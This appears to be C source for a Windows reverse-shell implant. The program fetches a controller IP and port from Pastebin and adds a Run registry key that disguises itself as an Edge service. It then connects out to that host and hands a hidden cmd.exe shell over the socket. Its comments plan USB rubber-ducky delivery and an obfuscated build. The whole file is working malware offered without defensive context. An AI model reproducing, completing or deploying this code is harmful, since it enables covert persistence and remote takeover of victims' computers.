#include <winsock2.h>
#include <windows.h>
#include <io.h>
#include <process.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

/*
---TODO----
use ico file
rubber ducky script //WHY IS THIS SO HARD ((FIND A STORAGE PLACE OR HOST IT))
OBFUSCATED VERSION
*/
int main(void) {
	char cwd[200]; // get directory
	HKEY hkey;  //key var
	FILE *findPort; //"file" for the curl command
	FILE *findIP; //see above
	char portstr[6]; //contains port as string
	char ipstr[16]; //contains ip
	char space[30]; //space for the curl command -- more than necessary

	findPort = popen("curl -s https://pastebin.com/raw/qe6a4vY0", "r"); //pastebin for port
	fgets(portstr, sizeof(space), findPort); //output in portstr
	pclose(findPort); // close file
	int port = atoi(portstr); //array to int
	printf("%d", port); //testing

	findIP = popen("curl -s https://pastebin.com/raw/07Ke7e2w", "r"); //pastebin for ip
	fgets(ipstr, sizeof(space), findIP); //output in ipstr
	pclose(findIP);
	printf("%d", ipstr); //testing

	
	if (getcwd(cwd, sizeof(cwd))!= NULL) { //if getcwd works
		strcat(cwd, "\\msedge.exe"); //add \\msedge to cwd
	}
	
	if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hkey) == ERROR_SUCCESS) { //if key can open
		RegSetKeyValueA(hkey, NULL, "MSEDGESERVICE", REG_SZ, cwd, (DWORD) strlen(cwd) + 1); //create new key for "MSEDGESERVICE"
		RegCloseKey(hkey); //close key when done
	}

	WSADATA wsaData; //WSADATA needed for sockets
	if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) { //if WSA cant start
    	fprintf(stderr, "WSAStartup failed.\n"); // print failure
    	return 1;
	}
	//int port = CLIENT_PORT; //port variable
	struct sockaddr_in sa; // sa is an instance of struct used for socket connection
	SOCKET sockt = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0); //internet address family, stream socker, TCP/IP protocol
	sa.sin_family = AF_INET; //always AF_INET
	sa.sin_port = htons(port); //convert to network byte order
	sa.sin_addr.s_addr = inet_addr(ipstr); //set socket internet address to ipstr
 
/*#ifdef WAIT_FOR_CLIENT
	continue
#endif */
	//for testing
	if (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
		write(2, "[ERROR] connect failed.\n", 24);
		return (1);
	}


	STARTUPINFO sinfo; //sinfo is instance of startupinfo (used for starting the app)
	memset(&sinfo, 0, sizeof(sinfo)); //startupinfo == 0
	sinfo.cb = sizeof(sinfo); //cb = size of startupinfo structure
	sinfo.dwFlags = (STARTF_USESTDHANDLES); //use handles for stdinput, stdoutput, stderror
	sinfo.hStdInput = (HANDLE)sockt; //set handles to socket (input)
	sinfo.hStdOutput = (HANDLE)sockt; //set handles to socket (output)
	sinfo.hStdError = (HANDLE)sockt; //set handles to socket (error)
	PROCESS_INFORMATION pinfo; //creates (empty) struct for processinfo (pinfo)
	CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo); //create cmd process

	return (0);
}